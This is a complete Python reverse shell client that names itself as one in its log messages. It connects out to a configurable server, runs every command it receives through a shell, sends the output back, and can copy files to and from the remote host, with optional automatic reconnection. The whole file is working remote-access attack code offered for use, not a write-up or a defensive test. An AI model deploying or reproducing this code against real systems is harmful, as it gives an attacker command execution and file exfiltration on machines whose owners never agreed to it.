import socket
import os
import subprocess
import datetime
import json
import time
import sys

# Load configuration from config.json
def load_config():
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
            log_message("Configuration loaded from config.json")
            return config
    except FileNotFoundError:
        log_message("config.json not found, using default values", "WARNING")
        return None
    except json.JSONDecodeError as e:
        log_message(f"Invalid JSON in config file: {e}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Error loading config: {e}", "ERROR")
        return None

# Simple logging function
def log_message(message, level="INFO"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    
    try:
        with open("client.log", "a") as log_file:
            log_file.write(log_entry)
    except:
        pass

# Display countdown with live updates
def countdown_display(seconds, message="Retrying"):
    try:
        for i in range(seconds, 0, -1):
            sys.stdout.write(f"\r{message} in {i} seconds...")
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()
    except KeyboardInterrupt:
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()
        raise

# Display progress bar for file transfers
def show_progress(current, total, filename, action="Transferring"):
    percent = (current / total) * 100
    bar_len = 30
    filled = int(bar_len * current / total)
    bar = '█' * filled + '░' * (bar_len - filled)
    size_mb = total / (1024 * 1024)
    current_mb = current / (1024 * 1024)
    sys.stdout.write(f"\r{action}: {filename} [{bar}] {percent:.1f}% ({current_mb:.2f}/{size_mb:.2f} MB)")
    sys.stdout.flush()
    if current >= total:
        print()

# Connect to server
def connect_to_server(host, port):
    try:
        s = socket.socket()
        log_message(f"Attempting to connect to {host}:{port}")
        s.connect((host, port))
        log_message(f"Connected successfully to {host}:{port}")
        return s
    except socket.error as e:
        log_message(f"Connection failed: {str(e)}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Unexpected error during connection: {str(e)}", "ERROR")
        return None

# Check if connection is still alive
def is_connection_alive(s):
    try:
        s.recv(1, socket.MSG_PEEK)
        return True
    except socket.error:
        return False
    except Exception:
        return False

# Send file to server (for download command)
def send_file(s, filename):
    try:
        if not os.path.isfile(filename):
            s.send(b"FILE_NOT_FOUND")
            log_message(f"File not found: {filename}", "ERROR")
            return False
        
        file_size = os.path.getsize(filename)
        s.send(file_size.to_bytes(8, 'big'))
        
        with open(filename, 'rb') as f:
            bytes_sent = 0
            while bytes_sent < file_size:
                chunk = f.read(4096)
                if not chunk:
                    break
                s.send(chunk)
                bytes_sent += len(chunk)
                show_progress(bytes_sent, file_size, filename, "Sending")
        
        log_message(f"File sent: {filename} ({file_size} bytes)")
        return True
        
    except Exception as e:
        log_message(f"Error sending file: {str(e)}", "ERROR")
        return False

# Receive file from server (for upload command)
def receive_file(s, filename):
    try:
        file_size = int.from_bytes(s.recv(8), 'big')
        log_message(f"Receiving {filename} ({file_size} bytes)...")
        
        bytes_received = 0
        with open(filename, 'wb') as f:
            while bytes_received < file_size:
                chunk = s.recv(min(4096, file_size - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
                show_progress(bytes_received, file_size, filename, "Receiving")
        
        log_message(f"File received: {filename}")
        return True
        
    except Exception as e:
        log_message(f"Error receiving file: {str(e)}", "ERROR")
        return False

# Execute commands received from server
def execute_commands(s):
    try:
        while True:
            try:
                if not is_connection_alive(s):
                    log_message("Connection health check failed", "WARNING")
                    break
                
                s.settimeout(1.0)
                
                try:
                    data = s.recv(1024)
                except socket.timeout:
                    continue
                
                s.settimeout(None)
                
                if not data:
                    log_message("Server closed connection", "WARNING")
                    break
                
                cmd = data.decode("utf-8")
                
                if cmd.startswith("download "):
                    filename = cmd[9:].strip()
                    log_message(f"Download requested: {filename}")
                    send_file(s, filename)
                    continue
                
                if cmd.startswith("upload "):
                    filename = cmd[7:].strip()
                    log_message(f"Upload incoming: {filename}")
                    receive_file(s, filename)
                    continue
                
                if data[:2].decode("utf-8") == 'cd':
                    try:
                        os.chdir(data[3:].decode("utf-8"))
                        log_message(f"Changed directory to: {os.getcwd()}")
                    except Exception as e:
                        log_message(f"Failed to change directory: {str(e)}", "ERROR")
                        error_msg = f"Error: {str(e)}\n"
                        try:
                            s.send(str.encode(error_msg + os.getcwd() + "> "))
                        except socket.error:
                            log_message("Failed to send response - connection lost", "ERROR")
                            break
                        continue
                
                if len(data) > 0:
                    try:
                        cmd_str = data[:].decode("utf-8")
                        log_message(f"Executing command: {cmd_str}")
                        
                        cmd = subprocess.Popen(
                            cmd_str, 
                            shell=True,
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                        
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte, "utf-8")
                        currentWD = os.getcwd() + "> "
                        
                        try:
                            s.send(str.encode(output_str + currentWD))
                            log_message(f"Command executed successfully")
                        except socket.error as e:
                            log_message(f"Failed to send response: {str(e)}", "ERROR")
                            break
                        
                    except Exception as e:
                        log_message(f"Error executing command: {str(e)}", "ERROR")
                        error_msg = f"Error executing command: {str(e)}\n"
                        try:
                            s.send(str.encode(error_msg + os.getcwd() + "> "))
                        except socket.error:
                            log_message("Failed to send error message - connection lost", "ERROR")
                            break
                            
            except socket.error as e:
                log_message(f"Socket error: {str(e)}", "ERROR")
                break
            except Exception as e:
                log_message(f"Unexpected error in command loop: {str(e)}", "ERROR")
                break
                
    except KeyboardInterrupt:
        log_message("Client interrupted by user", "WARNING")
    except Exception as e:
        log_message(f"Error in execute_commands: {str(e)}", "ERROR")
    finally:
        try:
            s.close()
            log_message("Connection closed")
        except:
            pass

def main():
    config = load_config()
    
    if config and "client" in config:
        host = config["client"].get("server_ip", "127.0.0.1")
        port = config["client"].get("server_port", 9999)
        reconnect_enabled = config["client"].get("reconnect_enabled", False)
        reconnect_delay = config["client"].get("reconnect_delay", 5)
        max_attempts = config["client"].get("max_reconnect_attempts", 0)
    else:
        host = "127.0.0.1"
        port = 9999
        reconnect_enabled = False
        reconnect_delay = 5
        max_attempts = 0
        log_message("Using default configuration", "WARNING")
    
    log_message("=" * 50)
    log_message("Reverse Shell Client Starting...")
    log_message("=" * 50)
    
    attempt = 0
    
    try:
        while True:
            attempt += 1
            
            if max_attempts > 0 and attempt > max_attempts:
                log_message(f"Maximum reconnection attempts ({max_attempts}) reached. Exiting...", "ERROR")
                break
            
            if attempt > 1:
                log_message(f"Reconnection attempt #{attempt}")
            
            log_message(f"Attempting to connect to {host}:{port}")
            
            s = connect_to_server(host, port)
            
            if s is not None:
                log_message("Connection established successfully")
                attempt = 0
                
                execute_commands(s)
                
                log_message("Connection lost", "WARNING")
                
                if not reconnect_enabled:
                    log_message("Auto-reconnect is disabled. Exiting...", "WARNING")
                    break
                
                log_message(f"Reconnecting in {reconnect_delay} seconds...")
                countdown_display(reconnect_delay, "Reconnecting")
            else:
                if not reconnect_enabled:
                    log_message("Failed to connect to server. Exiting...", "ERROR")
                    break
                
                if max_attempts == 0:
                    log_message(f"Connection failed. Unlimited retries enabled.", "WARNING")
                else:
                    remaining = max_attempts - attempt
                    log_message(f"Connection failed. {remaining} attempt(s) remaining.", "WARNING")
                
                countdown_display(reconnect_delay, "Retrying")
                
    except KeyboardInterrupt:
        log_message("\nClient interrupted by user (Ctrl+C)", "WARNING")
    
    log_message("Client shutting down...")

if __name__ == "__main__":
    main()
